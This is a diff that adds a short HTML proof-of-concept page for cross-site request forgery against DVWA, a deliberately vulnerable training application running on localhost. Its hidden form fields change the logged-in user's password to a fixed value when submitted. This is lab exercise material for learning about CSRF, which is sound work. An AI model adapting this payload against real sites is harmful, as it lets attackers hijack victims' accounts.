@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DVWA CSRF PoC</title>
+</head>
+<body>
+
+<h2>CSRF Proof of Concept</h2>
+
+<form action="http://localhost:8080/DVWA/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" name="password_new" value="CSRFtest123!">
+    <input type="hidden" name="password_conf" value="CSRFtest123!">
+    <input type="hidden" name="Change" value="Change">
+    <input type="submit" value="Change Password">
+</form>
+
+</body>
+</html>
